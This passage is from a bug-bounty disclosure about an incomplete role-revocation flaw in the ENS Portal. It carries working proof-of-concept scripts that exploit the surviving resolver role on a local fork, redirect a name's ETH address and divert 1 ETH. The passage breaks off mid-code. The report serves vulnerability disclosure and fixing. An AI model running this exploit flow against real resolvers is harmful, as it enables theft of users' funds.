# 90459 w a critical incomplete resolver role revocation leaves attacker control over another ens name and enables direct fund theft

**Submitted on Aug 25th 2026 at 06:32:06 UTC by @coinsspor for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90459
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user funds
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

### Brief/Intro

The ENS Portal combines resolver permissions from multiple name resources into one account row, but its **Remove user** action revokes roles for only one of those resources. A delegated account that appears to have been removed can therefore retain on-chain authority over another name on the same PermissionedResolver. The retained account can change that name's ETH address record to an attacker-controlled address. The PoC reproduces the normal Portal removal flow, resolves the modified registered `.eth` name through the L1 Universal Resolver, and demonstrates a 1 ETH transfer to the attacker address.

### Vulnerability Details

Resolver role assignments are scoped by three values:

```
(resolver, resource, account)
```

The resource identifies the name to which the role bitmap applies. Removing an account from multiple names therefore requires a separate resource-specific revocation for every name.

The Portal drops this resource binding when it prepares the resolver roles table. In `groupRolesByAccount()`, the grouping key is only the lower-cased account address. When another assignment for the same account is encountered, its resource name and decoded roles are appended to the existing account row:

```ts
const account = role.account.toLowerCase()
const resource = role.resource.toLowerCase()
const decoded = decodeResolverRoleBitmap(role.roleBitmap)
const resolvedName = resourceToName?.get(resource) ?? null

const existing = grouped.get(account)

if (existing) {
  existing.roles.push(role)
  existing.decodedRoles.push(...decoded)
  if (resolvedName) existing.resolvedNames.add(resolvedName)
} else {
  const names = new Set<string>()
  if (resolvedName) names.add(resolvedName)
  grouped.set(account, {
    account,
    resolvedNames: names,
    roles: [role],
    decodedRoles: [...decoded],
  })
}
```

As a result, one displayed user row may represent several distinct resource-scoped authorizations.

`ResolverRolesSidebar` receives this aggregate row but reduces all represented resources to the first non-root name:

```ts
const selectedAccount = row?.original.account as Address
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []

const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The **Remove user** handler then stores that single name together with the combined role list:

```ts
setPendingAction({
  type: 'remove',
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
})
```

Finally, the mutation submits only one revocation transaction:

```ts
return revokeResolverRoles({
  resolverAddress,
  name,
  account,
  roles,
  walletClient,
  publicClient,
  signer,
  chainId,
  id: REMOVE_RESOLVER_USER_TX_ID,
})
```

For example, assume one delegated attacker account has:

* `ROLE_SET_TEXT` on `alpha.eth`; and
* `ROLE_SET_ADDR` on `beta.eth`.

Both names use the same PermissionedResolver. Portal displays one user row containing both permissions. The administrator selects that row, clicks **Remove user**, confirms the removal, and approves the transaction constructed by Portal. The generated transaction is equivalent to:

```
authorizeNameRoles(alpha.eth, 17, attacker, false)
```

Only the `alpha.eth` resource is changed. The successful receipt does not revoke `ROLE_SET_ADDR` from the attacker on `beta.eth`.

The PoC executes the following sequence against the competition revision:

{% stepper %}
{% step %}

### Register and configure names

Register two real `.eth` names using the official local ENS infrastructure.

Attach both names to one PermissionedResolver.
{% endstep %}

{% step %}

### Grant resource-scoped roles

Grant the attacker different resource-scoped roles on the two names.
{% endstep %}

{% step %}

### Remove the attacker through Portal

Start the frozen Portal in Chromium with the project's headless wallet.

Follow the normal UI sequence: **Edit user roles → Remove user → Remove → Start → Open wallet**.

Capture the actual `eth_sendTransaction` request produced by Portal.
{% endstep %}

{% step %}

### Verify incomplete revocation

Execute that transaction and confirm that the first role is revoked while the second role remains active.

Confirm the negative control: the attacker can no longer change the revoked name.
{% endstep %}

{% step %}

### Exploit the surviving role

Use the surviving role to change the second name's ETH address record.

Resolve the second registered name through the L1 Universal Resolver.

Transfer 1 ETH to the returned address and assert that the attacker balance increases by exactly 1 ETH.
{% endstep %}
{% endstepper %}

The vulnerable function, Portal UI, wallet request, PermissionedResolver behavior, Universal Resolver response, transaction receipt, and final balance change are not mocked. The GraphQL projection is supplied with the exact role rows created on the local chain because the public Panoptes service was unavailable; all security-sensitive behavior after that projection is executed by the frozen Portal and real local contracts.

The affected competition revision is:

```
63772fd872af472ced58b009499355f3430c2a86
```

The issue is rooted in `apps/portal`, not in the ENS contracts. PermissionedResolver correctly applies the resource-specific calldata it receives. Portal is responsible for collapsing several resources into one row and producing only one resource-specific revocation while presenting the operation as removal of the user.

### Impact Details

This finding matches the selected in-scope impacts:

1. **Direct theft of user funds.** After the administrator completes the advertised removal flow, the attacker retains an on-chain address-record role that the administrator reasonably believes was revoked. The attacker can point the affected ENS name to their own payout address. Any user or application that subsequently relies on normal ENS resolution can send funds to the attacker. The PoC demonstrates this consequence with a successful 1 ETH transfer and an exact 1 ETH increase in the attacker address balance.
2. **Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient.** The retained authority allows the attacker to make the affected ENS name resolve to an attacker-controlled address. A sender using that ENS resolution receives the attacker address instead of the address expected by the name administrator and transfers funds to the unintended recipient.

The impact is persistent across refreshes, reconnects, browser sessions, and devices because the omitted authorization remains on-chain. Recovery requires the administrator to notice the discrepancy and submit additional resource-specific revocation and record-repair transactions. Funds already transferred to the attacker-controlled address cannot be recovered without the attacker's cooperation.

The attacker does not require the administrator's private key, browser access, local-storage modification, a malicious extension, or a smart-contract exploit. The required victim behavior is the normal Portal workflow for removing a previously delegated user. The attacker needs only a delegated account that has roles on at least two names served by the same resolver, followed by use of the role that Portal failed to revoke.

## References

* Affected asset: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* Resource aggregation root cause: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220>
* Single-name selection in the aggregate sidebar: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L170>
* Remove-user action construction: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L307-L321>
* Resource-specific revoke mutation: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L251-L276>
* Runnable PoC, complete source code, execution output, transaction evidence, before/after state, negative control, and fix validation are provided directly in the Proof of Concept section of this report.

## Proof of Concept

### What this PoC proves

This PoC executes the vulnerable code from the frozen competition revision and proves the complete security consequence:

```
two resource-scoped role assignments
→ Portal groups both assignments into one account row
→ Portal constructs one revoke for only the first name
→ the first role is revoked
→ the second role remains active
→ attacker changes the second name's ETH address record
→ L1 Universal Resolver returns the attacker payout address
→ a sender transfers 1 ETH to that resolved address
→ attacker payout balance increases by exactly 1 ETH
```

It also contains two negative controls:

1. After removal, an attacker record write against the first name reverts.
2. After the experimental fix, the same two assignments produce two resource-specific rows instead of one aggregate row.

No production network or real user is attacked. The chain is the project's official local Sepolia-fork environment with deterministic test accounts.

### Frozen revision and requirements

```
Repository: https://github.com/immunefi-team/audit-comp-ens
Branch: audit-comp-ready
Policy revision: 63772fd872af472ced58b009499355f3430c2a86
Public import commit: cda79acaad59711b943fc68207ebb3f1d0ff8596
The PoC runs against the public competition import of audited policy revision 63772fd872af472ced58b009499355f3430c2a86; the affected Portal code is unchanged in that import.
Node: 22.22.0
pnpm: 10.27.0
Docker: required by the official local ENS environment
Chromium: installed through the repository's Playwright package
```

At least 8 GB of free disk space is recommended for dependencies, Docker images, and Chromium.

### File layout

Create the following directory next to the cloned repository:

```
/root/audits/ens/
├── frozen-src/                       # competition repository at cda79ac
└── bulunanbuglar/ENS-001/
    ├── run-poc.sh
    ├── poc.local-chain.test.ts
    ├── vitest.local-chain.config.ts
    ├── poc.playwright.spec.ts
    ├── playwright.config.ts
    └── package.json
```

### One-command reproduction

Save the files below, then run:

```bash
chmod +x /root/audits/ens/bulunanbuglar/ENS-001/run-poc.sh
/root/audits/ens/bulunanbuglar/ENS-001/run-poc.sh
```

If the public Sepolia endpoint is unavailable, supply another Sepolia RPC only as the source for the isolated local fork:

```bash
SEPOLIA_FORK_URL=https://YOUR_SEPOLIA_RPC \
  /root/audits/ens/bulunanbuglar/ENS-001/run-poc.sh
```

### `run-poc.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

repo=/root/audits/ens/frozen-src
rpc=http://127.0.0.1:8545
finding=/root/audits/ens/bulunanbuglar/ENS-001
portal_url=http://127.0.0.1:3014
portal_server_pid=''

cleanup() {
  if [[ -n "$portal_server_pid" ]]; then
    kill "$portal_server_pid" 2>/dev/null || true
    wait "$portal_server_pid" 2>/dev/null || true
  fi
}
trap cleanup EXIT

cd "$repo"
npm exec --yes --package=node@22.22.0 --package=pnpm@10.27.0 -- \
  pnpm install --frozen-lockfile

if ! curl -fsS -X POST "$rpc" -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}' \
  | grep -q '0xaa36a7'; then
  SEPOLIA_FORK_URL="${SEPOLIA_FORK_URL:-https://ethereum-sepolia-rpc.publicnode.com}" \
    bash e2e/infra/scripts/start-local-env.sh || true
fi

curl -fsS -X POST "$rpc" -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_chainId","params":[],"id":1}' \
  | grep -q '0xaa36a7'

npm exec --yes --package=node@22.22.0 --package=pnpm@10.27.0 -- \
  pnpm --filter portal exec vitest run \
  --config "$finding/vitest.local-chain.config.ts" \
  --reporter=verbose

npm exec --yes --package=node@22.22.0 --package=pnpm@10.27.0 -- \
  pnpm --filter @ens-apps/e2e exec playwright install chromium

VITE_SEPOLIA_RPC_URL="$rpc" E2E_MOCK_INDEXER=true \
  npm exec --yes --package=node@22.22.0 --package=pnpm@10.27.0 -- \
  pnpm --filter portal dev --host 127.0.0.1 --port 3014 &
portal_server_pid=$!

for _attempt in $(seq 1 90); do
  if curl -fsS "$portal_url" >/dev/null; then break; fi
  sleep 1
done
curl -fsS "$portal_url" >/dev/null

E2E_MOCK_INDEXER=true PORTAL_APP_URL="$portal_url" \
  npm exec --yes --package=node@22.22.0 --package=pnpm@10.27.0 -- \
  pnpm --filter @ens-apps/e2e exec playwright test \
  --config "$finding/playwright.config.ts"
```

### `vitest.local-chain.config.ts`

```ts
import { fileURLToPath } from 'node:url'

const repo = fileURLToPath(new URL('../../frozen-src/', import.meta.url))

export default {
  test: {
    globals: true,
    environment: 'node',
    include: [
      fileURLToPath(new URL('./poc.local-chain.test.ts', import.meta.url)),
    ],
    testTimeout: 120_000,
  },
  resolve: {
    alias: {
      '@': `${repo}apps/portal/src`,
      '@ens-apps/utils': `${repo}packages/utils/src`,
      '@ens-apps/transaction-manager': `${repo}packages/transaction-manager/src`,
      viem: `${repo}apps/portal/node_modules/viem`,
      vitest: `${repo}apps/portal/node_modules/vitest`,
    },
  },
}
```

### `poc.local-chain.test.ts`

```ts
import { describe, expect, it } from 'vitest'
import { writeFileSync } from 'node:fs'
import {
  createPublicClient,
  createWalletClient,
  decodeFunctionData,
  defineChain,
  http,
  namehash,
  parseEther,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { hasRoles } from '@ensdomains/ensjs/public/v2'
import { getAddressRecord } from '@ensdomains/ensjs/public'
import {
  ensL1Contracts,
  extendChainWithEns,
  supportedL1Chains,
} from '@ensdomains/ensjs/chain'
import { createMakeName } from '../../frozen-src/e2e/fixtures/makeName'
import { prepareDeployPermissionedResolverTransaction } from '../../frozen-src/apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver'
import { parseProxyDeployedAddress } from '../../frozen-src/apps/portal/src/features/resolver/utils/permissionedResolver'
import { prepareGrantResolverRolesTransaction } from '../../frozen-src/apps/portal/src/features/resolver/helpers/grantResolverRoles'
import { prepareRevokeResolverRolesTransaction } from '../../frozen-src/apps/portal/src/features/resolver/helpers/revokeResolverRoles'
import { prepareSaveRecordsTransaction } from '../../frozen-src/apps/portal/src/features/records/helpers/saveRecords'
import { prepareChangeResolverTransaction } from '../../frozen-src/apps/portal/src/features/resolver/helpers/changeResolver'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  resolverRoles,
} from '../../frozen-src/apps/portal/src/lib/roles/resolverRoles'

const RPC = 'http://127.0.0.1:8545'
const chain = defineChain({
  ...extendChainWithEns({
    id: 11155111,
    name: 'Sepolia',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    rpcUrls: { default: { http: [RPC] } },
  }),
  id: 11155111,
  name: 'Anvil Sepolia fork',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [RPC] } },
})

const VICTIM_KEY =
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as const
const ATTACKER_KEY =
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d' as const

const victim = privateKeyToAccount(VICTIM_KEY)
const attacker = privateKeyToAccount(ATTACKER_KEY)
const payout = {
  address: '0x4444444444444444444444444444444444444444' as Address,
}

const publicClient = createPublicClient({ chain, transport: http(RPC) })
const victimWallet = createWalletClient({
  account: victim,
  chain,
  transport: http(RPC),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain,
  transport: http(RPC),
})

const resolverReadAbi = [
  {
    type: 'function',
    name: 'addr',
    stateMutability: 'view',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'coinType', type: 'uint256' },
    ],
    outputs: [{ name: '', type: 'bytes' }],
  },
] as const

async function sendIntent(
  wallet: typeof victimWallet,
  intent: ReturnType<typeof prepareGrantResolverRolesTransaction>,
) {
  if (intent.request.type !== 'eoa') throw new Error('expected EOA request')

  const hash = await wallet.sendTransaction({
    account: wallet.account,
    chain,
    to: intent.request.to,
    data: intent.request.data as Hex,
    value: intent.request.value,
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  if (receipt.status !== 'success') {
    throw new Error(`transaction reverted: ${hash}`)
  }
  return { hash, receipt, request: intent.request }
}

describe('ENS-001: retained resolver authority after Remove user', () => {
  it('keeps the second resource live and redirects a 1 ETH transfer', async () => {
    const makeName = createMakeName({
      accounts: {
        getAddress: () => victim.address,
        getPrivateKey: () => VICTIM_KEY,
      },
      time: { sync: async () => undefined } as never,
    })

    // These are real registrations in the official local environment.
    const alpha = await makeName({ label: 'ens001-alpha', owner: 'user' })
    const beta = await makeName({ label: 'ens001-beta', owner: 'user' })

    // The official bundler can sweep deterministic accounts. Refill local gas.
    await publicClient.request({
      method: 'anvil_setBalance' as 'eth_chainId',
      params: [attacker.address, '0x56bc75e2d63100000'] as never,
    })

    // Deploy a real PermissionedResolver through Portal's transaction builder.
    const deployIntent = prepareDeployPermissionedResolverTransaction({
      from: victim.address,
      chainId: chain.id,
      salt: (await publicClient.getBlockNumber()) + 14014n,
    })
    const deployed = await sendIntent(victimWallet, deployIntent)
    const resolver = parseProxyDeployedAddress(deployed.receipt.logs)
    expect(resolver).not.toBeNull()
    if (!resolver) throw new Error('resolver deployment event missing')

    // Attach both registered names to the same resolver through Portal code.
    const ethRegistry =
      ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

    await sendIntent(
      victimWallet,
      prepareChangeResolverTransaction({
        name: alpha,
        registryAddress: ethRegistry,
        resolverAddress: resolver,
        from: victim.address,
        chainId: chain.id,
      }),
    )
    await sendIntent(
      victimWallet,
      prepareChangeResolverTransaction({
        name: beta,
        registryAddress: ethRegistry,
        resolverAddress: resolver,
        from: victim.address,
        chainId: chain.id,
      }),
    )

    // Give one attacker different roles on two resources.
    await sendIntent(
      victimWallet,
      prepareGrantResolverRolesTransaction({
        resolverAddress: resolver,
        name: alpha,
        account: attacker.address,
        roles: ['ROLE_SET_TEXT'],
        walletClient: victimWallet,
        chainId: chain.id,
      }),
    )
    await sendIntent(
      victimWallet,
      prepareGrantResolverRolesTransaction({
        resolverAddress: resolver,
        name: beta,
        account: attacker.address,
        roles: ['ROLE_SET_ADDR'],
        walletClient: victimWallet,
        chainId: chain.id,
      }),
    )

    const alphaTextBefore = await hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: computeNameResource(alpha),
      roles: ['ROLE_SET_TEXT'],
      account: attacker.address,
    })
    const betaAddrBefore = await hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: computeNameResource(beta),
      roles: ['ROLE_SET_ADDR'],
      account: attacker.address,
    })
    expect(alphaTextBefore).toBe(true)
    expect(betaAddrBefore).toBe(true)

    writeFileSync(
      '/root/audits/ens/bulunanbuglar/ENS-001/before-state.json',
      JSON.stringify(
        {
          resolver,
          alpha,
          beta,
          attacker: attacker.address,
          alphaTextBefore,
          betaAddrBefore,
        },
        null,
        2,
      ),
    )

    // This is the exact vulnerable Portal grouping operation.
    const [uiRow] = groupRolesByAccount(
      [
        {
          account: attacker.address,
          resource: computeNameResource(alpha),
          roleBitmap: resolverRoles.ROLE_SET_TEXT.toString(),
        },
        {
          account: attacker.address,
          resource: computeNameResource(beta),
          roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
        },
      ],
      buildResourceToNameMap([{ name: alpha }, { name: beta }]),
    )

    // Portal shows both resources in one row.
    expect(uiRow.resolvedNames).toEqual([alpha, beta])

    // Exact resource selection performed by ResolverRolesSidebar.tsx.
    const roleName =
      uiRow.resolvedNames.find((name) => name !== '(root)') ?? ''

    // Exact revoke transaction produced by frozen Portal code.
    const revokeIntent = prepareRevokeResolverRolesTransaction({
      resolverAddress: resolver,
      name: roleName,
      account: attacker.address,
      roles: uiRow.decodedRoles as (keyof typeof resolverRoles)[],
      walletClient: victimWallet,
      chainId: chain.id,
    })
    const revoked = await sendIntent(victimWallet, revokeIntent)

    const decodedRevoke = decodeFunctionData({
      abi: [
        {
          type: 'function',
          name: 'authorizeNameRoles',
          stateMutability: 'nonpayable',
          inputs: [
            { name: 'toName', type: 'bytes' },
            { name: 'roleBitmap', type: 'uint256' },
            { name: 'account', type: 'address' },
            { name: 'grant', type: 'bool' },
          ],
          outputs: [{ name: '', type: 'bool' }],
        },
      ],
      data: revoked.request.data as Hex,
    })
    expect(decodedRevoke.functionName).toBe('authorizeNameRoles')
    expect(decodedRevoke.args[2].toLowerCase()).toBe(
      attacker.address.toLowerCase(),
    )
    expect(decodedRevoke.args[3]).toBe(false)

    // The transaction succeeds, but only alpha is revoked.
    const alphaTextAfter = await hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: computeNameResource(alpha),
      roles: ['ROLE_SET_TEXT'],
      account: attacker.address,
    })
    const betaAddrAfter = await hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: computeNameResource(beta),
      roles: ['ROLE_SET_ADDR'],
      account: attacker.address,
    })
    expect(alphaTextAfter).toBe(false)
    expect(betaAddrAfter).toBe(true)

    const makeAddressIntent = (name: string) =>
      prepareSaveRecordsTransaction({
        name,
        resolverAddress: resolver,
        originalRecords: [],
        pendingChanges: {
          newRecords: [
            { type: 'address', key: 'ETH', id: 60, value: payout.address },
          ],
          editedValues: new Map(),
          deletedIds: new Set(),
        },
        walletClient: attackerWallet,
        chainId: chain.id,
      })

    // Negative control: the selected alpha resource really was revoked.
    await expect(
      (async () =>
        sendIntent(
          attackerWallet as typeof victimWallet,
          await makeAddressIntent(alpha),
        ))(),
    ).rejects.toThrow()

    // Exploit: beta survives the advertised remove-all action.
    await sendIntent(
      attackerWallet as typeof victimWallet,
      await makeAddressIntent(beta),
    )

    const resolvedBytes = await publicClient.readContract({
      address: resolver,
      abi: resolverReadAbi,
      functionName: 'addr',
      args: [namehash(beta), 60n],
    })
    expect(resolvedBytes.toLowerCase()).toBe(payout.address.toLowerCase())

    // Resolve through the official L1 Universal Resolver path.
    const universalResolved = await getAddressRecord(publicClient as never, {
      name: beta,
      coin: 'ETH',
    })
    expect(universalResolved?.value.toLowerCase()).toBe(
      payout.address.toLowerCase(),
    )

    // Prove concrete fund loss to the attacker-controlled resolution result.
    const payoutBefore = await publicClient.getBalance({
      address: payout.address,
    })
    const transferHash = await victimWallet.sendTransaction({
      account: victim,
      chain,
      to: resolvedBytes as Address,
      value: parseEther('1'),
    })
    const transferReceipt = await publicClient.waitForTransactionReceipt({
      hash: transferHash,
    })
    const payoutAfter = await publicClient.getBalance({
      address: payout.address,
    })

    expect(transferReceipt.status).toBe('success')
    expect(payoutAfter - payoutBefore).toBe(parseEther('1'))
  })
})
```

### `playwright.config.ts`

The finding directory uses ESM so the Playwright configuration and test can import the repository's TypeScript modules directly.

#### `package.json`

```json
{
  "name": "ens-001-evidence",
  "private": true,
  "type": "module"
}
```

```ts
import { baseConfig } from '../../frozen-src/e2e/playwright.config.base'

export default {
  ...baseConfig,
  testDir: '.',
  testMatch: /poc\.playwright\.spec\.ts$/,
  outputDir: './playwright-results',
  reporter: [['list'], ['json', { outputFile: 'playwright-report.json' }]],
  timeout: 180_000,
  use: {
    ...baseConfig.use,
    baseURL: process.env.PORTAL_APP_URL ?? 'http://127.0.0.1:3001',
    trace: 'on',
    screenshot: 'only-on-failure',
    video: 'off',
  },
  projects: [{ name: 'ens-001-portal-ui', use: { browserName: 'chromium' } }],
}
```

### `poc.playwright.spec.ts`

The local-chain test writes the deployed resolver, registered names, and attacker address to `before-state.json`. This browser test restores both grants, supplies those exact on-chain assignments to the otherwise unavailable Panoptes projection, clicks the real frozen UI, captures the actual wallet request, executes it, and verifies the final chain state.

```ts
import { readFileSync, writeFileSync } from 'node:fs'
import { getAddressRecord } from '../../frozen-src/apps/portal/node_modules/@ensdomains/ensjs/dist/exports/public.js'
import { hasRoles } from '../../frozen-src/apps/portal/node_modules/@ensdomains/ensjs/dist/exports/public/v2.js'
import {
  createWalletClient,
  decodeFunctionData,
  http,
  namehash,
  parseEther,
  type Address,
  type Hex,
} from '../../frozen-src/apps/portal/node_modules/viem/_esm/index.js'
import { privateKeyToAccount } from '../../frozen-src/apps/portal/node_modules/viem/_esm/accounts/index.js'
import {
  expect,
  test,
  connectWithHeadlessWallet,
} from '../../frozen-src/e2e/fixtures/playwright.portal.fixture'
import { publicClient, walletClient } from '../../frozen-src/e2e/helpers/anvil-client'
import { authorizeTransaction } from '../../frozen-src/e2e/helpers/portal-auth'
import { prepareGrantResolverRolesTransaction } from '../../frozen-src/apps/portal/src/features/resolver/helpers/grantResolverRoles'
import { prepareSaveRecordsTransaction } from '../../frozen-src/apps/portal/src/features/records/helpers/saveRecords'
import {
  computeNameResource,
  resolverRoles,
} from '../../frozen-src/apps/portal/src/lib/roles/resolverRoles'

const OUT = '/root/audits/ens/bulunanbuglar/ENS-001'
const PAYOUT = '0x4444444444444444444444444444444444444444' as Address
const authorizeNameRolesAbi = [{
  type: 'function',
  name: 'authorizeNameRoles',
  stateMutability: 'nonpayable',
  inputs: [
    { name: 'toName', type: 'bytes' },
    { name: 'roleBitmap', type: 'uint256' },
    { name: 'account', type: 'address' },
    { name: 'grant', type: 'bool' },
  ],
  outputs: [{ name: '', type: 'bool' }],
}] as const

async function execute(
  request: { type: 'eoa'; to: Address; data?: Hex; value?: bigint },
  account: ReturnType<typeof privateKeyToAccount>,
) {
  const hash = await walletClient.sendTransaction({
    account,
    chain: walletClient.chain,
    to: request.to,
    data: request.data,
    value: request.value,
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return { hash, receipt }
}

test('real Portal Remove user UI leaves the second resource authorized', async ({
  portalPage: page,
  wallet,
  accounts,
}) => {
  const before = JSON.parse(readFileSync(`${OUT}/before-state.json`, 'utf8')) as {
    resolver: Address
    alpha: string
    beta: string
    attacker: Address
  }
  const { resolver, alpha, beta, attacker } = before
  const victim = privateKeyToAccount(accounts.getPrivateKey('user'))
  const attackerAccount = privateKeyToAccount(accounts.getPrivateKey('user2'))
  const victimClient = createWalletClient({
    account: victim,
    chain: publicClient.chain,
    transport: http('http://127.0.0.1:8545'),
  })
  const attackerClient = createWalletClient({
    account: attackerAccount,
    chain: publicClient.chain,
    transport: http('http://127.0.0.1:8545'),
  })
  expect(attackerAccount.address.toLowerCase()).toBe(attacker.toLowerCase())

  // Restore the two-resource precondition after the local-chain test.
  for (const [name, role] of [
    [alpha, 'ROLE_SET_TEXT'],
    [beta, 'ROLE_SET_ADDR'],
  ] as const) {
    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: resolver,
      name,
      account: attacker,
      roles: [role],
      walletClient: victimClient,
      chainId: 11155111,
    })
    if (intent.request.type !== 'eoa') throw new Error('expected EOA grant')
    await execute(intent.request, victim)
  }

  const alphaResource = computeNameResource(alpha)
  const betaResource = computeNameResource(beta)
  const overview = {
    id: resolver.toLowerCase(),
    address: resolver,
    nodeCount: 2,
    aliasCount: 0,
    roleHolderCount: 1,
    nodes: [alpha, beta].map((name) => ({
      id: namehash(name),
      name,
      owner: { id: victim.address.toLowerCase() },
      resolver: {
        id: `${resolver.toLowerCase()}-${namehash(name)}`,
        address: resolver,
      },
    })),
    aliases: [],
    roles: [
      {
        account: attacker,
        resource: alphaResource,
        roleBitmap: resolverRoles.ROLE_SET_TEXT.toString(),
        blockNumber: 1,
        transactionHash: null,
        timestamp: null,
        name: alpha,
      },
      {
        account: attacker,
        resource: betaResource,
        roleBitmap: resolverRoles.ROLE_SET_ADDR.toString(),
        blockNumber: 2,
        transactionHash: null,
        timestamp: null,
        name: beta,
      },
    ],
    events: [],
  }

  // Panoptes was unavailable. Only its projection is supplied; the rows are
  // exact copies of the legitimate grants made above on the local chain.
  await page.route(
    /:5655\/graphql(?!\.)|\/indexer\/graphql(?!\.)|staging-graphql\.ens\.dev/,
    async (route) => {
      const body = JSON.parse(route.request().postData() ?? '{}') as {
        operationName?: string
        query?: string
      }
      if (
        body.operationName === 'getResolverOverview' ||
        body.query?.includes('query getResolverOverview')
      ) {
        await route.fulfill({
          status: 200,
          json: { data: { resolver: overview } },
        })
        return
      }
      await route.fulfill({ status: 200, json: { data: {} } })
    },
  )

  let generatedTransaction: Record<string, unknown> | undefined
  const originalRequest = wallet.request.bind(wallet)
  wallet.request = (async (request: { method: string; params?: unknown[] }) => {
    if (request.method === 'eth_sendTransaction') {
      generatedTransaction = request.params?.[0] as Record<string, unknown>
    }
    return originalRequest(request as never)
  }) as typeof wallet.request

  await connectWithHeadlessWallet(page, wallet)
  await page.goto(`/resolver/${resolver}/roles`)
  await expect(page.getByRole('heading', { name: 'Roles' })).toBeVisible()
  await expect(page.getByText(alpha, { exact: true })).toBeVisible()
  await expect(page.getByText(beta, { exact: true })).toBeVisible()

  await page.getByRole('button', { name: 'Edit user roles' }).click()
  await expect(page.getByText(`Roles scoped to ${alpha}, ${beta}`)).toBeVisible()
  await page.getByRole('button', { name: 'Remove user' }).click()
  const confirmation = page.getByRole('dialog').filter({
    hasText: 'remove this user from all roles',
  })
  await expect(confirmation).toBeVisible()
  await confirmation.getByRole('button', { name: 'Remove', exact: true }).click()
  await page.getByRole('button', { name: 'Start', exact: true }).click()

  const authorization = authorizeTransaction(wallet, 60_000)
  await page.getByRole('button', { name: 'Open wallet', exact: true }).click()
  await authorization
  await expect(page.getByRole('button', { name: 'Done', exact: true })).toBeVisible({
    timeout: 60_000,
  })

  expect(generatedTransaction).toBeDefined()
  const decoded = decodeFunctionData({
    abi: authorizeNameRolesAbi,
    data: generatedTransaction?.data as Hex,
  })
  expect(decoded.functionName).toBe('authorizeNameRoles')
  expect(decoded.args[1]).toBe(17n)
  expect(decoded.args[2].toLowerCase()).toBe(attacker.toLowerCase())
  expect(decoded.args[3]).toBe(false)

  const [alphaAfter, betaAfter] = await Promise.all([
    hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: alphaResource,
      roles: ['ROLE_SET_TEXT'],
      account: attacker,
    }),
    hasRoles(publicClient, {
      resolverAddress: resolver,
      resource: betaResource,
      roles: ['ROLE_SET_ADDR'],
      account: attacker,
    }),
  ])
  expect(alphaAfter).toBe(false)
  expect(betaAfter).toBe(true)

  const maliciousIntent = await prepareSaveRecordsTransaction({
    name: beta,
    resolverAddress: resolver,
    originalRecords: [],
    pendingChanges: {
      newRecords: [{ type: 'address', key: 'ETH', id: 60, value: PAYOUT }],
      editedValues: new Map(),
      deletedIds: new Set(),
    },
    walletClient: attackerClient,
    chainId: 11155111,
  })
  if (maliciousIntent.request.type !== 'eoa') {
    throw new Error('expected EOA record write')
  }
  const malicious = await execute(maliciousIntent.request, attackerAccount)

  const resolved = await getAddressRecord(publicClient as never, {
    name: beta,
    coin: 'ETH',
  })
  expect(resolved?.value.toLowerCase()).toBe(PAYOUT.toLowerCase())
  if (!resolved?.value) {
    throw new Error('beta did not resolve to an address')
  }

  const payoutBefore = await publicClient.getBalance({ address: PAYOUT })
  const transferHash = await walletClient.sendTransaction({
    account: victim,
    chain: walletClient.chain,
    to: resolved.value as Address,
    value: parseEther('1'),
  })
  const transferReceipt = await publicClient.waitForTransactionReceipt({
    hash: transferHash,
  })
  const payoutAfter = await publicClient.getBalance({ address: PAYOUT })
  expect(transferReceipt.status).toBe('success')
  expect(payoutAfter - payoutBefore).toBe(parseEther('1'))

  writeFileSync(
    `${OUT}/playwright-generated-transaction.json`,
    JSON.stringify(generatedTransaction, null, 2),
  )
  writeFileSync(
    `${OUT}/playwright-after-state.json`,
    JSON.stringify(
      {
        alphaAfter,
        betaAfter,
        resolvedAddress: resolved?.value,
        maliciousRecordTransaction: malicious.hash,
        transferHash,
        payoutBefore: payoutBefore.toString(),
